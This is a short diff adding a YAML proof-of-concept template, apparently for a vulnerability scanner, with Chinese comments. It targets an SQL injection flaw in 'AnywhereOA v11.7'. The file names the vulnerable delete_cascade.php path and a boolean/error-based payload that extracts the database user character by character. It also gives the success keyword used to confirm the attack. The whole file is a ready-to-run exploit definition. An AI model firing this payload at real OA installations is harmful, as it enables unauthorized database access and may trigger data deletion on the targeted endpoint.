@@ -1,0 +1,36 @@
+#poc名称
+- name:
+  - name: "AnywhereOA_OA_v11_7_ background_SQL_injection"
+
+#请求方式
+- method:
+  - method: "get"
+
+#漏洞的位置
+- url:
+  - url : "/general/hr/manage/query/delete_cascade.php"
+
+#payload
+- payload:
+  - payload: 'condition_cascade=select if((substr(user(),1,1)='r'),1,power(9999,99))'
+
+#response包里状态码
+- status:
+  - status: "200"
+
+#response包里的关键字
+- word:
+  - word:
+      - "信息删除成功"
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "isNone"
+
+#webshell位置
+- verify:
+  - verify : "isNone"
+
+#cmd 为了适配Java反序列化漏洞
+- cmd:
+  - cmd : "isNone"
